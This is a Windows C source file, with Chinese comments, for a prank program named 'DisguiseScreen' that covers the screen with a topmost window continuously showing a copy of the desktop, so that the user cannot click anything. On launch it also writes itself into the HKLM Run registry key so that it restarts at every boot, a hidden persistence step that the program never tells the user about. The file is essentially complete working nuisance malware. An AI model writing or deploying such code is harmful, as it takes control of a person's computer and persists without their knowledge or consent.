/*创建一个覆盖屏幕的窗口，显示窗口上所有的东西，导致使用者点击不了屏幕上的东西*/
/*可用任务管理器关闭*/
#include <windows.h>
#include <windowsx.h> 

const int TimerId = 1; 
LRESULT CALLBACK WndProc(HWND,UINT,WPARAM,LPARAM);
RECT Screen,TaskList;

int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
    WNDCLASSEX wc;
    HWND hwnd;
    MSG msg;

    memset(&wc,0,sizeof(wc));
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.lpfnWndProc = WndProc; /* This is where we will send messages to */
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL,IDC_ARROW);
    wc.style = CS_HREDRAW|CS_VREDRAW; 

    wc.hbrBackground = 0;        //解决闪烁问题. 
    wc.lpszClassName = "DisguiseScreen";
    wc.hIcon = LoadIcon(NULL,IDI_APPLICATION); /* Load a standard icon */
    wc.hIconSm = LoadIcon(NULL,IDI_APPLICATION); /* use the name "A" to use the project icon */

    if(!RegisterClassEx(&wc))
    {
        MessageBox(NULL,"Window Registration Failed!","Error!",MB_ICONEXCLAMATION|MB_OK);
        return 0;
    }
    
    GetWindowRect(GetDesktopWindow(),&Screen);
    GetWindowRect(FindWindow(TEXT("Shell_TrayWnd"),0),&TaskList);
    
    hwnd = CreateWindowEx(WS_EX_TOOLWINDOW|WS_EX_TOPMOST|WS_EX_LAYERED,"DisguiseScreen","",WS_VISIBLE,-2,-25,
        Screen.right-Screen.left + 20, /* width */
        Screen.bottom-Screen.top - (TaskList.bottom - TaskList.top)+25, /* height */
        NULL,NULL,hInstance,NULL);

    if(hwnd == NULL)
    {
        MessageBox(NULL,"Window Creation Failed!","Error!",MB_ICONEXCLAMATION|MB_OK);
        return 0;
    }
    
    while(GetMessage(&msg,NULL,0,0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hwnd,UINT Message,WPARAM wParam,LPARAM lParam)
{
    static HDC hdc;
    static HDC hSrcDC;
    static HWND DesktopHwnd; 
    static RECT DeskTop,Client; 
    static PAINTSTRUCT ps;
    static int cx = 480;
    static int cy = 640;
    static HKEY hKey;
    static TCHAR Filename[100];
    switch(Message)
    {
        case WM_CREATE:
        {
            //判断环境是否为WOW64
			BOOL isWOW64;  
			REGSAM P;
			IsWow64Process(GetCurrentProcess(),&isWOW64);  
			if (isWOW64)
			{  
				P = KEY_WRITE | KEY_WOW64_64KEY;  
			}
			else
			{  
				P = KEY_WRITE;  
			}
			GetModuleFileName(0,Filename,100);
			RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,NULL,0,P,NULL,&hKey,NULL);
			RegDeleteKeyEx(hKey,"DisguiseScreen",P,0); 
			RegSetValueEx(hKey,"DisguiseScreen",0,REG_SZ,(CONST BYTE*)Filename,sizeof(Filename)*sizeof(TCHAR));
			RegCloseKey(hKey);
			/*写入注册表*/
			
            SendMessage(hwnd,WM_KILLFOCUS,0,0);
            GetWindowRect(GetDesktopWindow(),&DeskTop);
            SetLayeredWindowAttributes(hwnd,0,255,LWA_ALPHA);    //客户区不再显示本窗口 
            SetTimer(hwnd,TimerId,50,0);
            break;
        }
        
        case WM_TIMER:
        {
            InvalidateRect(hwnd,NULL,TRUE);
            break;
        }
        
        case WM_SIZE:
        {
            cx = GET_X_LPARAM(lParam);
            cy = GET_Y_LPARAM(lParam);
            break; 
        }
        
        case WM_PAINT:
        {
            hdc = BeginPaint(hwnd,&ps);
            hSrcDC = GetDC(DesktopHwnd);
            SetStretchBltMode(hdc,COLORONCOLOR);
            BitBlt(hdc,0,0,cx,cy,hSrcDC,0,0,SRCCOPY);
            EndPaint(hwnd,&ps);
            ReleaseDC(DesktopHwnd,hSrcDC);
            break;
        }
        
        case WM_KEYDOWN:
        {
            if(wParam == VK_HOME)   //关闭快捷键 
            {
                DestroyWindow(hwnd);
            }
            break;
        } 
          
        case WM_DESTROY:
        {
            KillTimer(hwnd,TimerId);
            PostQuitMessage(0);
            break;
        }
        
        default:
            return DefWindowProc(hwnd,Message,wParam,lParam);
    }
    return 0;
}
